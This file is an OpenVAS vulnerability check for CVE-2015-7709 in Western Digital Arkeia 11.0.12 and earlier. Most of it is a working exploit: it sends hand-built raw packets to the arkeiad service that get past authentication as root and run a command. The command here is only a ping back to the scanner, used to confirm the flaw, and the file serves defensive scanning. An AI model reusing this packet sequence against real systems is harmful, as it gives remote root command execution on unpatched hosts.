###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_arkeia_west_dig_rce.nasl 9978 2018-05-28 08:52:24Z cfischer $
#
# Western Digital Arkeia <= v11.0.12 Remote Code Execution Vulnerability
#
# Authors:
# Tameem Eissa <tameem.eissa@greenbone.net>
#
# Copyright:
# Copyright (c) 2016 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:arkeia:western_digital_arkeia";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.107041");
  script_version("$Revision: 9978 $");
  script_cve_id("CVE-2015-7709");

  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"$Date: 2018-05-28 10:52:24 +0200 (Mon, 28 May 2018) $");
  script_tag(name:"creation_date", value:"2016-08-16 13:16:06 +0200 (Tue, 16 Aug 2016)");

  script_name("Western Digital Arkeia <= v11.0.12 Remote Code Execution Vulnerability");
  script_category(ACT_ATTACK);

  script_copyright("This script is Copyright (C) 2016 Greenbone Networks GmbH");
  script_family("General");
  script_dependencies("gb_arkeia_virtual_appliance_detect_617.nasl", "os_detection.nasl");
  script_mandatory_keys("ArkeiaAppliance/installed");
  script_require_ports("Services/arkeiad", 617);

  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2015/Jul/54");

  script_tag(name:"summary", value:"This host is running Arkeia Appliance and is affected by a remote code execution vulnerability.");
  script_tag(name:"vuldetect", value:"Execute a command using the ARKFS_EXEC_CMD function");
  script_tag(name:"solution", value:"For updates refer to http://www.arkeia.com/");
  script_tag(name:"insight", value:"The insufficient checks on the authentication of all clients in arkeiad daemon can be bypassed.");
  script_tag(name:"affected", value:"Western Digital Arkeia 11.0.12 and below.");
  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to execute arbitrary commands with root or SYSTEM privileges.");

  script_tag(name:"solution_type", value: "VendorFix");
  script_tag(name:"qod_type", value:"remote_active");

  exit(0);
}

include("dump.inc");
include("host_details.inc");
include("misc_func.inc");

function arkeiad_recv( soc )
{
    r = recv( socket:soc, length: 8 );

    if( ! r || strlen (r) < 8) return;

    len = ord( r[7] );
    if( ! len || len < 1 ) return r;
    r += recv( socket:soc, length:len );

    return r;
}

if( ! port = get_app_port( cpe:CPE, service: 'arkeiad' ) ) exit( 0 );

soc = open_sock_tcp( port );
if ( ! soc ) exit ( 0 );

req = raw_string( 0x00, 0x41, 0x00, 0x00, 0x00, 0x00, 0x00, 0x70 )
	+ crap ( data: raw_string(0) , length: 12)
	+ raw_string ( 0xc0, 0xa8, 0x02, 0x8a )
	+ crap ( data: raw_string(0), length: 56)
	+ raw_string (0x8a, 0x02, 0xa8)
	+ raw_string (0xc0, 0x41, 0x52, 0x4b, 0x46, 0x53) # "ARKFS"
	+ raw_string (0x00)
	+ raw_string (0x72, 0x6f, 0x6f, 0x74)  #"root"
	+ raw_string (0x00)
	+ raw_string (0x72, 0x6f, 0x6f, 0x74) #"root"
	+ crap (data: raw_string (0), length: 3)
	+ raw_string (0x34, 0x2e, 0x33, 0x2e, 0x30, 0x2d, 0x31) #"4.3.0-1"
	+ crap (data: raw_string(0), length: 11);

send( socket:soc, data:req );
res = arkeiad_recv( soc:soc );

if( raw_string(0x00, 0x60, 0x00, 0x04)  >!< res ) exit(0);

req2 = raw_string( 0x00, 0x73, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0c, 0x32)
          + crap ( data: raw_string ( 0 ), length: 11 );

send( socket:soc, data: req2);
res2 = arkeiad_recv( soc:soc );

if ( raw_string(0x00, 0x60, 0x00, 0x04)  >!< res2 ) exit(0);

req3 = raw_string ( 0x00, 0x61, 0x00, 0x04, 0x00, 0x01, 0x00, 0x1a,
                    0x00, 0x00, 0x31, 0x33, 0x39, 0x32, 0x37, 0x31,
                    0x32, 0x33, 0x39, 0x38, 0x00, 0x45, 0x4e )
   + crap ( data : raw_string ( 0 ), length: 11 ) ;

send( socket:soc, data: req3);

res3 = arkeiad_recv( soc:soc );

if ( raw_string( 0x00, 0x43, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00 ) >!< res3 ) exit(0);

req4 = raw_string ( 0x00, 0x62, 0x00, 0x01, 0x00, 0x02, 0x00, 0x1b,
                    0x41, 0x52, 0x4b, 0x46, 0x53, 0x5f, 0x45, 0x58,
                    0x45, 0x43, 0x5f, 0x43, 0x4d, 0x44, 0x00, 0x31)
           + crap ( data : raw_string ( 0 ), length: 11 );

send( socket: soc, data: req4);
res4 = arkeiad_recv( soc:soc );

if (raw_string( 0x00, 0x43, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00 ) >!< res4 ) exit(0);

if ( host_runs( "Windows") == "yes")
{
  command = 'ping -c 5 ' + this_host();
  win = TRUE;
}
else
  command = 'ping -c 5 -p 5f5f4f70656e5641535f5f ' + this_host();

cmdlen = raw_string(strlen( command ));

req5 = raw_string (0x00, 0x63, 0x00, 0x04, 0x00, 0x03, 0x00, 0x15,
0x31, 0x00, 0x31, 0x00, 0x31, 0x00, 0x30, 0x3a,
0x31, 0x2c)
          + crap ( data : raw_string ( 0 ), length: 12 )
          + raw_string (0x64, 0x00,0x04, 0x00,0x04, 0x00)
          + cmdlen
          + command
          + raw_string(0x00);

send( socket: soc, data: req5);
for ( i = 0; i< 3; i++)
{
  res5 = send_capture ( socket:soc, data: "", timeout:2,
                        pcap_filter: string( "icmp and icmp[0] = 8 and dst host ", this_host(), " and src host ", get_host_ip() ) );

  if( res5 && ( win || "___OpenVAS__" >< res5 ) ) {
    close ( soc );
    report = 'By sending a special request it was possible to execute `' +  command + '` on the remote host\nReceived answer:\n\n' + hexdump(ddata:( res5 ) );
    security_message( port:port, data:report );
    exit( 0 );
  }
}
if ( soc ) close ( soc );

exit( 99 );
